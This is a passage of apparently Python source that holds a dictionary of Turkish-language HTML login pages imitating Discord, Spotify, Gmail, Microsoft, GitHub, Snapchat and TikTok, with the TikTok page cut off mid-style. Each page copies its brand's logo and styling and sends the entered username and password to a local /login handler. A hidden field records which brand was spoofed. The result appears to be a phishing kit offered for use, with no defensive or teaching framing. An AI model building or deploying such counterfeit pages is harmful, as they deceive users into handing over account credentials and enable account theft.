    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Discord'da oturum aç</title>
    <style>
        :root {
            --discord-blue: #5865f2;
            --discord-dark: #36393f;
            --discord-darker: #2f3136;
            --discord-text: #dcddde;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--discord-dark); color: var(--discord-text); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', sans-serif; }
        .login-container { background: var(--discord-darker); padding: 30px; border-radius: 8px; width: 100%; max-width: 480px; box-shadow: 0 2px 10px 0 rgba(0,0,0,.2); }
        .header { text-align: center; margin-bottom: 20px; }
        .discord-logo { color: var(--discord-blue); font-size: 24px; font-weight: 700; margin-bottom: 8px; }
        .welcome-text { font-size: 18px; font-weight: 600; color: white; margin-bottom: 8px; }
        .subtext { color: #b9bbbe; font-size: 16px; }
        .input-group { margin-bottom: 20px; }
        .input-label { color: #b9bbbe; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; display: block; }
        .input-field { width: 100%; padding: 10px; background: #202225; border: none; border-radius: 3px; color: var(--discord-text); font-size: 16px; transition: all 0.2s; }
        .input-field:focus { outline: none; box-shadow: 0 0 0 2px var(--discord-blue); }
        .forgot-password { color: #00aff4; text-decoration: none; font-size: 14px; display: inline-block; margin-top: 8px; }
        .login-btn { width: 100%; padding: 12px; background: var(--discord-blue); color: white; border: none; border-radius: 3px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; transition: background 0.2s; touch-action: manipulation; }
        .login-btn:active { background: #4752c4; transform: scale(0.98); }
        .register-link { color: #00aff4; text-decoration: none; font-size: 14px; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #72767d; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #72767d; }
        .divider span { margin: 0 10px; font-size: 14px; }
        .qr-option { text-align: center; }
        .qr-code { background: #202225; border-radius: 3px; padding: 20px; display: inline-block; margin-bottom: 10px; }
        .qr-text { color: #b9bbbe; font-size: 14px; }
        .qr-link { color: #00aff4; text-decoration: none; display: inline-block; margin-top: 10px; }
        .footer { margin-top: 20px; text-align: center; color: #72767d; font-size: 12px; }
        .footer a { color: #00aff4; text-decoration: none; }
        @media (max-width: 450px) {
            .login-container { padding: 20px; }
            .discord-logo { font-size: 22px; }
            .welcome-text { font-size: 16px; }
            .input-field { padding: 12px; }
            .login-btn { padding: 14px; }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header">
            <div class="discord-logo">Discord</div>
            <div class="welcome-text">Tekrar hoş geldin!</div>
            <div class="subtext">Seni yeniden görmek ne güzel!</div>
        </div>
        <form method="POST" action="/login">
            <input type="hidden" name="platform" value="discord">
            <div class="input-group">
                <label class="input-label">E-posta veya telefon numarası</label>
                <input class="input-field" type="text" name="username" required autocomplete="username">
                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
            </div>
            <div class="input-group">
                <label class="input-label">Şifre</label>
                <input class="input-field" type="password" name="password" required autocomplete="current-password">
            </div>
            <button class="login-btn" type="submit">Giriş Yap</button>
        </form>
        <div class="divider"><span>VEYA</span></div>
        <div class="qr-option">
            <div class="qr-code">
                <div style="width: 100px; height: 100px; background: var(--discord-blue); margin: 0 auto; border-radius: 8px;"></div>
            </div>
            <p class="qr-text">QR Kod ile giriş yap</p>
            <a href="#" class="qr-link">QR kodumu göster</a>
        </div>
        <div class="footer">
            <p>Hesaba mı ihtiyacın var? <a href="#" class="register-link">Kayıt Ol</a></p>
            <p style="margin-top: 10px;">
                <a href="#">Gizlilik Politikası</a> • 
                <a href="#">Şartlar</a> • 
                <a href="#">Çerezler</a>
            </p>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, input, a').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 8. Spotify
    "spotify": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Spotify - Web Player: Müzik, her yerde</title>
    <style>
        :root {
            --spotify-green: #1DB954;
            --spotify-black: #000;
            --spotify-dark: #121212;
            --spotify-light: #b3b3b3;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--spotify-black); color: #fff; min-height: 100vh; font-family: 'Circular', -apple-system, BlinkMacSystemFont, sans-serif; }
        .navbar { background: var(--spotify-black); padding: 20px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #282828; }
        .spotify-logo { color: var(--spotify-green); font-size: 28px; font-weight: bold; }
        .nav-links { display: flex; gap: 20px; }
        .nav-links a { color: var(--spotify-light); text-decoration: none; font-size: 16px; }
        .hero { background: linear-gradient(180deg, var(--spotify-green) 0%, #191414 100%); padding: 60px 5%; text-align: center; }
        .hero h1 { font-size: 36px; font-weight: 900; margin-bottom: 20px; }
        .hero p { font-size: 18px; margin-bottom: 30px; color: var(--spotify-light); }
        .login-container { max-width: 450px; margin: 30px auto; background: var(--spotify-dark); padding: 30px; border-radius: 8px; }
        .login-title { font-size: 28px; font-weight: 700; margin-bottom: 25px; text-align: center; }
        .input-field { width: 100%; padding: 14px; margin-bottom: 20px; background: var(--spotify-dark); border: 1px solid #535353; border-radius: 4px; color: #fff; font-size: 16px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--spotify-green); }
        .login-btn { width: 100%; padding: 16px; background: var(--spotify-green); color: black; border: none; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: background 0.2s; touch-action: manipulation; }
        .login-btn:active { background: #1ed760; transform: scale(0.98); }
        .options { display: flex; justify-content: space-between; margin-top: 20px; color: var(--spotify-light); font-size: 14px; }
        .divider { display: flex; align-items: center; margin: 25px 0; color: #535353; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #535353; }
        .divider span { margin: 0 15px; }
        .social-login { display: flex; flex-direction: column; gap: 15px; }
        .social-btn { display: flex; align-items: center; justify-content: center; padding: 14px; background: transparent; border: 1px solid #535353; border-radius: 30px; color: white; font-size: 16px; cursor: pointer; transition: all 0.2s; touch-action: manipulation; }
        .social-btn:active { border-color: white; }
        .social-btn i { margin-right: 10px; font-size: 20px; }
        .signup-link { text-align: center; margin-top: 25px; color: var(--spotify-light); }
        .signup-link a { color: white; font-weight: 700; text-decoration: none; }
        footer { background: var(--spotify-dark); padding: 30px 5%; margin-top: 40px; border-top: 1px solid #282828; }
        .footer-links { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
        .footer-column h3 { color: white; margin-bottom: 15px; font-size: 16px; }
        .footer-column a { display: block; color: var(--spotify-light); text-decoration: none; margin-bottom: 12px; font-size: 14px; }
        @media (min-width: 768px) {
            .spotify-logo { font-size: 32px; }
            .hero h1 { font-size: 48px; }
            .hero p { font-size: 24px; }
            .footer-links { grid-template-columns: repeat(5, 1fr); }
        }
        @media (max-width: 450px) {
            .navbar { padding: 15px 3%; }
            .nav-links { display: none; }
            .hero { padding: 40px 3%; }
            .hero h1 { font-size: 28px; }
            .login-container { padding: 25px 20px; margin: 20px 3%; }
            .login-title { font-size: 24px; }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <nav class="navbar">
        <div class="spotify-logo">Spotify</div>
        <div class="nav-links">
            <a href="#">Premium</a>
            <a href="#">Destek</a>
            <a href="#">İndir</a>
            <a href="#">Kaydol</a>
        </div>
    </nav>
    <div class="hero">
        <h1>Milyonlarca şarkı. Ücretsiz.</h1>
        <p>Müziğin tadını çıkarın.</p>
    </div>
    <div class="login-container">
        <h1 class="login-title">Spotify'da oturum aç</h1>
        <form method="POST" action="/login">
            <input type="hidden" name="platform" value="spotify">
            <input class="input-field" type="text" name="username" placeholder="E-posta adresi veya kullanıcı adı" required autocomplete="username">
            <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
            <button class="login-btn" type="submit">Oturum aç</button>
        </form>
        <div class="options">
            <label><input type="checkbox" style="margin-right: 8px;"> Beni hatırla</label>
            <a href="#" style="color: var(--spotify-green); text-decoration: none;">Yardım mı lazım?</a>
        </div>
        <div class="divider"><span>veya</span></div>
        <div class="social-login">
            <button class="social-btn"><i class="fab fa-facebook"></i> FACEBOOK İLE DEVAM ET</button>
            <button class="social-btn"><i class="fab fa-apple"></i> APPLE İLE DEVAM ET</button>
            <button class="social-btn"><i class="fab fa-google"></i> GOOGLE İLE DEVAM ET</button>
        </div>
        <div class="signup-link">
            <p>Hesabınız yok mu? <a href="#">Spotify'a kaydolun</a></p>
        </div>
    </div>
    <footer>
        <div class="footer-links">
            <div class="footer-column">
                <h3>ŞİRKET</h3>
                <a href="#">Hakkında</a>
                <a href="#">İş Fırsatları</a>
            </div>
            <div class="footer-column">
                <h3>TOPLULUKLAR</h3>
                <a href="#">Sanatçılar İçin</a>
                <a href="#">Geliştiriciler</a>
                <a href="#">Reklam</a>
            </div>
            <div class="footer-column">
                <h3>YARARLI BAĞLANTILAR</h3>
                <a href="#">Destek</a>
                <a href="#">Web Çalar</a>
                <a href="#">Ücretsiz Mobil Uygulama</a>
            </div>
            <div class="footer-column">
                <h3>ABONE PAKETLERİ</h3>
                <a href="#">Premium Bireysel</a>
                <a href="#">Premium Çift</a>
                <a href="#">Premium Aile</a>
            </div>
            <div class="footer-column">
                <div style="margin-top: 20px;">
                    <a href="#" style="margin-right: 15px;"><i class="fab fa-instagram"></i></a>
                    <a href="#" style="margin-right: 15px;"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-facebook"></i></a>
                </div>
            </div>
        </div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, a, input').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 9. Gmail
    "gmail": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Gmail</title>
    <style>
        :root {
            --gmail-blue: #1a73e8;
            --gmail-gray: #5f6368;
            --gmail-light: #dadce0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: white; color: #202124; min-height: 100vh; font-family: 'Roboto', arial, sans-serif; }
        .navbar { padding: 20px 5%; display: flex; align-items: center; }
        .gmail-logo { color: var(--gmail-gray); font-size: 22px; margin-left: 10px; }
        .right-nav { margin-left: auto; display: flex; gap: 20px; }
        .right-nav a { color: var(--gmail-gray); text-decoration: none; font-size: 14px; }
        .container { max-width: 450px; margin: 30px auto; padding: 0 20px; }
        .google-logo { text-align: center; margin-bottom: 20px; }
        .google-logo img { width: 75px; height: 24px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; }
        .subtitle { color: var(--gmail-gray); text-align: center; margin-bottom: 30px; }
        .login-box { border: 1px solid var(--gmail-light); border-radius: 8px; padding: 40px 30px 30px; }
        .input-group { margin-bottom: 20px; }
        .input-field { width: 100%; padding: 13px 15px; border: 1px solid var(--gmail-light); border-radius: 4px; font-size: 16px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--gmail-blue); }
        .forgot-email { color: var(--gmail-blue); text-decoration: none; font-size: 14px; font-weight: 500; display: inline-block; margin-top: 10px; }
        .info-text { color: var(--gmail-gray); font-size: 14px; margin: 30px 0 20px; }
        .guest-mode { color: var(--gmail-gray); font-size: 14px; margin-top: 15px; }
        .guest-mode a { color: var(--gmail-blue); text-decoration: none; }
        .buttons { display: flex; justify-content: space-between; margin-top: 30px; }
        .create-account { color: var(--gmail-blue); text-decoration: none; font-weight: 500; padding: 10px 0; }
        .next-btn { background: var(--gmail-blue); color: white; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; touch-action: manipulation; }
        .next-btn:active { background: #1a63c7; transform: scale(0.98); }
        footer { background: #f2f2f2; padding: 20px 5%; margin-top: 40px; color: #70757a; font-size: 14px; }
        .footer-links { display: flex; justify-content: space-between; margin-top: 15px; flex-wrap: wrap; }
        .footer-links a { color: #70757a; text-decoration: none; margin-right: 15px; }
        .language-select { background: transparent; border: none; color: #70757a; font-size: 14px; }
        .help-link { position: absolute; right: 20px; top: 20px; color: var(--gmail-gray); text-decoration: none; font-size: 14px; }
        @media (max-width: 450px) {
            .navbar { padding: 15px 3%; }
            .right-nav { display: none; }
            .container { padding: 0 15px; }
            .login-box { padding: 30px 20px 20px; }
            .help-link { position: static; text-align: right; margin-bottom: 10px; }
            .footer-links { flex-direction: column; gap: 10px; }
        }
    </style>
</head>
<body>
    <a href="#" class="help-link">Yardım</a>
    <nav class="navbar">
        <div class="gmail-logo">Gmail</div>
        <div class="right-nav">
            <a href="#">İşletme için</a>
            <a href="#">Oturum aç</a>
            <a href="#">Hesap oluşturun</a>
        </div>
    </nav>
    <div class="container">
        <div class="google-logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" loading="lazy">
        </div>
        <h1 class="title">Gmail'e giriş yapın</h1>
        <div class="subtitle">Google Hesabınızla devam edin</div>
        <div class="login-box">
            <form method="POST" action="/login">
                <input type="hidden" name="platform" value="gmail">
                <div class="input-group">
                    <input class="input-field" type="text" name="username" placeholder="E-posta veya telefon" required autocomplete="username">
                </div>
                <a href="#" class="forgot-email">E-postayı unuttum?</a>
                <div class="info-text">Bu bilgisayar sizin için yeni mi? Gizli modu kullanarak oturum açın. <a href="#" style="color: var(--gmail-blue); text-decoration: none;">Daha fazla bilgi edinin</a></div>
                <div class="guest-mode">Başka bir kullanıcı olarak oturum açmak mı istiyorsunuz? <a href="#">Konuk modunu kullanın</a></div>
                <div class="buttons">
                    <a href="#" class="create-account">Hesap oluşturun</a>
                    <button class="next-btn" type="submit">Sonraki</button>
                </div>
            </form>
        </div>
    </div>
    <footer>
        <div>Bu bilgisayar sizin için yeni mi? Gizli modu kullanarak oturum açın. <a href="#" style="color: #70757a; text-decoration: none;">Daha fazla bilgi edinin</a></div>
        <div class="footer-links">
            <div>
                <a href="#">Yardım</a>
                <a href="#">Gizlilik</a>
                <a href="#">Şartlar</a>
            </div>
            <div>
                <select class="language-select">
                    <option>Türkçe</option>
                    <option>English</option>
                    <option>Deutsch</option>
                </select>
            </div>
        </div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, a, input, select').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 10. Microsoft
    "microsoft": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Microsoft hesabı</title>
    <style>
        :root {
            --ms-blue: #0078d4;
            --ms-gray: #605e5c;
            --ms-light: #e1dfdd;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: white; color: #323130; min-height: 100vh; font-family: 'Segoe UI', 'Helvetica Neue', sans-serif; }
        .navbar { padding: 20px 5%; display: flex; align-items: center; border-bottom: 1px solid var(--ms-light); }
        .microsoft-logo img { width: 108px; height: 23px; }
        .container { max-width: 440px; margin: 30px auto; padding: 0 20px; }
        .login-box { border: 1px solid var(--ms-light); border-radius: 4px; }
        .login-header { padding: 20px; border-bottom: 1px solid var(--ms-light); }
        .login-title { font-size: 24px; font-weight: 600; }
        .login-content { padding: 20px; }
        .input-group { margin-bottom: 20px; }
        .input-label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; }
        .input-field { width: 100%; padding: 10px 12px; border: 1px solid var(--ms-gray); border-radius: 2px; font-size: 15px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--ms-blue); }
        .forgot-password { color: var(--ms-blue); text-decoration: none; font-size: 14px; display: inline-block; margin-top: 10px; }
        .next-btn { background: var(--ms-blue); color: white; border: none; border-radius: 2px; padding: 10px 20px; font-size: 15px; font-weight: 600; cursor: pointer; float: right; transition: background 0.2s; touch-action: manipulation; }
        .next-btn:active { background: #106ebe; transform: scale(0.98); }
        .create-account { color: var(--ms-blue); text-decoration: none; font-size: 14px; display: inline-block; margin-top: 15px; }
        .options { margin-top: 30px; padding-top: 15px; border-top: 1px solid var(--ms-light); }
        .checkbox-label { display: flex; align-items: center; margin-bottom: 15px; }
        .checkbox-label input { margin-right: 10px; }
        .privacy { font-size: 12px; color: var(--ms-gray); margin-top: 20px; line-height: 1.5; }
        .privacy a { color: var(--ms-blue); text-decoration: none; }
        footer { background: #f3f2f1; padding: 30px 5%; margin-top: 40px; }
        .footer-links { display: flex; flex-wrap: wrap; gap: 15px; font-size: 12px; }
        .footer-links a { color: var(--ms-gray); text-decoration: none; }
        .copyright { color: var(--ms-gray); font-size: 12px; margin-top: 15px; }
        @media (max-width: 450px) {
            .navbar { padding: 15px 3%; }
            .container { padding: 0 15px; }
            .login-header { padding: 15px; }
            .login-content { padding: 15px; }
            .login-title { font-size: 20px; }
            .next-btn { float: none; width: 100%; margin-top: 10px; }
            .create-account { display: block; text-align: center; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="microsoft-logo">
            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft" loading="lazy">
        </div>
    </nav>
    <div class="container">
        <div class="login-box">
            <div class="login-header">
                <h1 class="login-title">Oturum aç</h1>
            </div>
            <div class="login-content">
                <form method="POST" action="/login">
                    <input type="hidden" name="platform" value="microsoft">
                    <div class="input-group">
                        <label class="input-label">E-posta, telefon veya Skype</label>
                        <input class="input-field" type="text" name="username" required autocomplete="username">
                        <a href="#" class="forgot-password">Hesabınızı mı unuttunuz?</a>
                    </div>
                    <div class="input-group">
                        <label class="input-label">Şifre</label>
                        <input class="input-field" type="password" name="password" required autocomplete="current-password">
                    </div>
                    <button class="next-btn" type="submit">Sonraki</button>
                    <div style="clear: both; margin-bottom: 15px;"></div>
                    <a href="#" class="create-account">Hesap oluşturun</a>
                </form>
                <div class="options">
                    <label class="checkbox-label">
                        <input type="checkbox"> Oturum açmamı unutma
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox"> Uygulamalarda ve hizmetlerde oturum açmak için Windows Hello kullan
                    </label>
                </div>
                <div class="privacy">
                    <p>Oturum açtığınızda <a href="#">Microsoft Hizmet Sözleşmesi</a>'ni ve <a href="#">gizlilik ve tanımlama bilgileri bildirimini</a> kabul etmiş olursunuz.</p>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer-links">
            <a href="#">Microsoft hakkında</a>
            <a href="#">Gizlilik ve tanımlama bilgileri</a>
            <a href="#">Kullanım Şartları</a>
            <a href="#">Ticari markalar</a>
            <a href="#">İletişim</a>
            <a href="#">Yardım</a>
            <a href="#">Tanımlama bilgileri (Çerezler)</a>
            <a href="#">Etik ve Uyumluluk</a>
            <a href="#">Sorumluluk Reddi</a>
            <a href="#">Kullanıcı Sözleşmesi</a>
        </div>
        <div class="copyright">© Microsoft 2024</div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, a, input, label').forEach(el => {
                    el.style.minHeight = '44px';
                    el.style.display = 'flex';
                    el.style.alignItems = 'center';
                });
            }
        });
    </script>
</body>
</html>""",

    # 11. GitHub
    "github": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>GitHub · Oturum Aç</title>
    <style>
        :root {
            --github-green: #238636;
            --github-blue: #58a6ff;
            --github-dark: #0d1117;
            --github-darker: #161b22;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--github-dark); color: #c9d1d9; min-height: 100vh; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
        .header { background: var(--github-darker); padding: 15px 5%; border-bottom: 1px solid #21262d; }
        .header-content { display: flex; justify-content: space-between; align-items: center; max-width: 1280px; margin: 0 auto; }
        .github-logo { display: flex; align-items: center; gap: 10px; }
        .github-logo img { width: 32px; height: 32px; }
        .github-logo span { font-size: 20px; font-weight: 600; }
        .nav-links { display: flex; gap: 20px; }
        .nav-links a { color: #c9d1d9; text-decoration: none; font-size: 14px; }
        .container { max-width: 340px; margin: 50px auto; padding: 0 20px; }
        .login-box { background: var(--github-darker); padding: 20px; border-radius: 6px; border: 1px solid #21262d; }
        .login-title { text-align: center; font-size: 24px; font-weight: 300; margin-bottom: 20px; }
        .input-group { margin-bottom: 16px; }
        .input-label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 400; }
        .input-field { width: 100%; padding: 8px 12px; background: var(--github-dark); border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-size: 14px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: #1f6feb; box-shadow: 0 0 0 3px rgba(31, 111, 235, 0.3); }
        .forgot-password { color: var(--github-blue); text-decoration: none; font-size: 12px; }
        .login-btn { width: 100%; padding: 8px 16px; background: var(--github-green); color: white; border: none; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 20px; transition: background 0.2s; touch-action: manipulation; }
        .login-btn:active { background: #2ea043; transform: scale(0.98); }
        .create-account-box { border: 1px solid #30363d; border-radius: 6px; padding: 16px; text-align: center; margin-top: 16px; }
        .create-account-text { font-size: 14px; }
        .create-account-link { color: var(--github-blue); text-decoration: none; font-weight: 500; }
        footer { border-top: 1px solid #21262d; padding: 30px 5%; margin-top: 50px; }
        .footer-links { max-width: 1280px; margin: 0 auto; display: flex; flex-wrap: wrap; gap: 15px; font-size: 12px; justify-content: center; }
        .footer-links a { color: #8b949e; text-decoration: none; }
        .footer-links img { width: 24px; height: 24px; }
        @media (max-width: 768px) {
            .nav-links { display: none; }
            .header-content { justify-content: center; }
            .container { margin: 30px auto; }
        }
        @media (max-width: 450px) {
            .container { padding: 0 15px; }
            .login-box { padding: 15px; }
            .login-title { font-size: 20px; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="github-logo">
                <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub" loading="lazy">
                <span>GitHub</span>
            </div>
            <div class="nav-links">
                <a href="#">Ürünler</a>
                <a href="#">Çözümler</a>
                <a href="#">Açık kaynak</a>
                <a href="#">Fiyatlandırma</a>
            </div>
        </div>
    </header>
    <div class="container">
        <div class="login-box">
            <h1 class="login-title">GitHub'a giriş yap</h1>
            <form method="POST" action="/login">
                <input type="hidden" name="platform" value="github">
                <div class="input-group">
                    <label class="input-label">Kullanıcı adı veya e-posta adresi</label>
                    <input class="input-field" type="text" name="username" required autocomplete="username">
                </div>
                <div class="input-group">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <label class="input-label">Şifre</label>
                        <a href="#" class="forgot-password">Şifrenizi mi unuttunuz?</a>
                    </div>
                    <input class="input-field" type="password" name="password" required autocomplete="current-password">
                </div>
                <button class="login-btn" type="submit">Oturum aç</button>
            </form>
        </div>
        <div class="create-account-box">
            <p class="create-account-text">GitHub'da yeni misiniz? <a href="#" class="create-account-link">Hesap oluşturun</a></p>
        </div>
    </div>
    <footer>
        <div class="footer-links">
            <a href="#">© 2024 GitHub, Inc.</a>
            <a href="#">Şartlar</a>
            <a href="#">Gizlilik</a>
            <a href="#">Sitemap</a>
            <a href="#">GitHub'un ne olduğunu mu öğreniyorsunuz?</a>
            <a href="#"><img src="https://github.githubassets.com/images/modules/site/icons/footer/github-mark.svg" alt="GitHub" loading="lazy"></a>
        </div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, a, input').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 12. Snapchat
    "snapchat": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Snapchat</title>
    <style>
        :root {
            --snap-yellow: #fffc00;
            --snap-black: #000;
            --snap-pink: #ff0050;
            --snap-blue: #00a8ff;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--snap-yellow); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        .login-container { background: white; padding: 30px; border-radius: 20px; width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.2); text-align: center; }
        .snapchat-logo { font-size: 42px; font-weight: 800; margin-bottom: 25px; background: linear-gradient(45deg, var(--snap-yellow), var(--snap-pink), var(--snap-blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .input-field { width: 100%; padding: 16px; margin-bottom: 16px; border: 2px solid var(--snap-black); border-radius: 12px; font-size: 16px; background: white; color: var(--snap-black); transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--snap-pink); }
        .login-btn { width: 100%; padding: 16px; background: var(--snap-black); color: var(--snap-yellow); border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: all 0.2s; touch-action: manipulation; }
        .login-btn:active { transform: scale(0.98); background: #333; }
        .divider { display: flex; align-items: center; margin: 25px 0; color: #666; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #ddd; }
        .divider span { margin: 0 15px; }
        .social-login { display: flex; flex-direction: column; gap: 12px; }
        .social-btn { display: flex; align-items: center; justify-content: center; padding: 14px; border: 2px solid var(--snap-black); border-radius: 12px; background: white; color: var(--snap-black); font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; touch-action: manipulation; }
        .social-btn:active { background: #f5f5f5; transform: scale(0.98); }
        .social-btn i { margin-right: 10px; font-size: 20px; }
        .signup-link { margin-top: 25px; color: #666; }
        .signup-link a { color: var(--snap-black); font-weight: 700; text-decoration: none; }
        .footer { margin-top: 30px; font-size: 12px; color: #666; }
        .footer a { color: #666; text-decoration: none; }
        @media (max-width: 450px) {
            .login-container { padding: 20px; border-radius: 15px; }
            .snapchat-logo { font-size: 36px; }
            .input-field { padding: 14px; }
            .login-btn { padding: 14px; font-size: 16px; }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="login-container">
        <div class="snapchat-logo">Snapchat</div>
        <form method="POST" action="/login">
            <input type="hidden" name="platform" value="snapchat">
            <input class="input-field" type="text" name="username" placeholder="Kullanıcı adı veya e-posta" required autocomplete="username">
            <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
            <button class="login-btn" type="submit">Giriş Yap</button>
        </form>
        <div class="divider"><span>VEYA</span></div>
        <div class="social-login">
            <button class="social-btn"><i class="fab fa-apple"></i> Apple ile giriş yap</button>
            <button class="social-btn"><i class="fab fa-google"></i> Google ile giriş yap</button>
        </div>
        <div class="signup-link">
            <p>Hesabın yok mu? <a href="#">Kaydol</a></p>
        </div>
        <div class="footer">
            <p><a href="#">Kullanım Koşulları</a> · <a href="#">Gizlilik Politikası</a></p>
            <p style="margin-top: 10px;">© Snap Inc. 2024</p>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, input, .social-btn').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 13. TikTok
    "tiktok": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>TikTok - Yaratıcılığınızı İfade Edin</title>
    <style>
        :root {
            --tiktok-pink: #ff0050;
            --tiktok-blue: #00f2ea;
            --tiktok-black: #000;
            --tiktok-dark: #121212;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--tiktok-black); color: #fff; min-height: 100vh; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        .container { max-width: 480px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .tiktok-logo { font-size: 42px; font-weight: 800; margin-bottom: 10px; background: linear-gradient(45deg, var(--tiktok-pink), var(--tiktok-blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .welcome { font-size: 22px; font-weight: 700; margin-top: 5px; }
        .login-box { background: var(--tiktok-dark); border-radius: 12px; padding: 25px; }
        .input-field { width: 100%; padding: 16px; margin-bottom: 16px; background: #222; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 16px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--tiktok-pink); }
